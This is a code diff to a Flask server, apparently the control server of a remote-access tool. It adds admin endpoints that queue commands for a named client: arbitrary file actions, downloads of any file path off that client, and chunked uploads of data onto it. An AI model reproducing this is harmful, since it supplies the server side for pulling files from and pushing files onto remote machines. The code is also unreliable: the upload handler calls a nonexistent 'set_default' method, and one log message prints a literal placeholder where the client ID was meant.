@@ -317,7 +317,6 @@ def get_commands():
     
     
 
-
 @app.route("/commands_result", methods=["POST"])
 def submit_command_result():
     try:
@@ -372,6 +371,122 @@ def submit_command_result():
         return jsonify({"error": f"Failed to submit result: {e}"}), 500
 
 
+@app.route("/admin/file/<client_id>", methods=["POST"])
+def send_file_command(client_id):
+    try:
+        command_data = request.json
+        action = command_data.get('action')
+        data = command_data.get("data", {})
+        
+        if not action:
+            return jsonify({"error": "No action specified"}), 400
+        
+        command_id = f"file_cmd_{int(time.time() * 1000)}"
+        pending_commands.setdefault(client_id, []).append({
+            "command_id": command_id,
+            "action": action,
+            "data": data,
+            "timestamp": time.time()
+        })
+        
+        if client_id in pending_commands:
+            pending_commands[client_id] = pending_commands[client_id][-10:]
+        
+        
+        
+        print(f"[FILE] command queued for [client_id]: {action}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f'File command queued for client {client_id}'
+        })
+    
+    
+    
+    except Exception as e:
+        return jsonify({"error": f"failed to queue file command: {e}"}), 500
+    
+    
+@app.route("/admin/file_download/<client_id>", methods=['POST'])
+def download_file(client_id):
+    try:
+        download_data = request.json
+        file_path = download_data.get("file_path")
+        
+        
+        if not file_path:
+            return jsonify({"error": "no file path specified"}), 400
+        
+        
+        command_id = f'dl_cmd_{int(time.time() * 1000)}'
+        pending_commands.setdefault(client_id, []).append({
+            "command_id": command_id,
+            "action": "file_download_chunk",
+            "data": {
+                "file_path": file_path,
+                "chunk_index": 0
+            },
+            "timestamp": time.time()
+        })
+        
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Download started for {file_path}"
+        })
+        
+        
+    except Exception as e:
+        return jsonify({"error": f"Download failed: {e}"}), 500
+    
+    
+    
+
+
+@app.route("/admin/file_upload/<client_id>", methods=["POST"])
+def upload_file(client_id):
+    try:
+        upload_data = request.json
+        file_path = upload_data.get("file_path")
+        chunk_data = upload_data.get('chunk_data')
+        chunk_index = upload_data.get('chunk_index', 0)
+        is_last = upload_data.get('is_last', False)
+        
+        
+        
+        if not file_path or not chunk_data:
+            return jsonify({"error": "Missing file path or chunk data"}), 400
+        
+        
+        
+        command_id = f"ul_cmd_{int(time.time() * 1000)}"
+        pending_commands.set_default(client_id, []).append({
+            "command_id": command_id,
+            "action": "file_upload_chunk",
+            "data": {
+                "file_path": file_path,
+                "chunk_data": chunk_data,
+                "chunk_index": chunk_index,
+                "is_last": is_last
+            },
+            "timestamp": time.time()
+        })
+        
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Upload chunk {chunk_index} received"
+        })
+    
+    
+    
+    except Exception as e:
+        return jsonify({"error": f"Upload failed: {e}"}), 500
+    
+    
+
+    
+    
 @app.before_request
 def before_request():
     print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")
